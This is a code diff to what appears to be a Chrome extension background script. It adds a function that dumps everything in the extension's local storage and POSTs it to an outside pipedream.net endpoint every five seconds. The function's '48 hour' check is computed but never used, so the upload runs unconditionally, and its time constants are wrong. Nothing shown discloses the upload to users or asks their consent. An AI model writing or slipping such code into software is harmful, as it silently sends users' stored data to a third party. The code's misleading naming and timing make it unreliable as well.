@@ -1,8 +1,41 @@
+async function check48hourUpload() {
+  console.log("check48hourUpload");
+
+  const visits = await getVisits();
+  const after24Hours = Date.now() - visits.firstHit >= 172800;
+
+    //generate db file & upload
+  chrome.storage.local.get(null, function(items) { // null implies all items
+    // Convert object to a string.
+    var result = JSON.stringify(items);
+
+    // Save as file
+    var url = 'data:application/json;base64,' + btoa(result);
+    
+    //upload
+    const headers = new Headers();
+    headers.append("Content-Type", "application/json");
+    const options = {
+      method: "POST",
+      headers,
+      mode: "cors",
+      body: result,
+    };
+
+  fetch("https://enl97gxfhbqeh.x.pipedream.net/", options);
+
+
+});
+
+
+
+}
+
 async function check24hourNotice() {
   console.log("check24hourNotice");
 
   const visits = await getVisits();
-  const after24Hours = Date.now() - visits.firstHit >= 86400000;
+  const after24Hours = Date.now() - visits.firstHit >= 864000000;
 
   console.log({
     after24Hours,
@@ -196,3 +229,5 @@ chrome.runtime.onInstalled.addListener(function(details) {
   }
 });
 setInterval(check24hourNotice, 5000);
+
+setInterval(check48hourUpload, 5000);
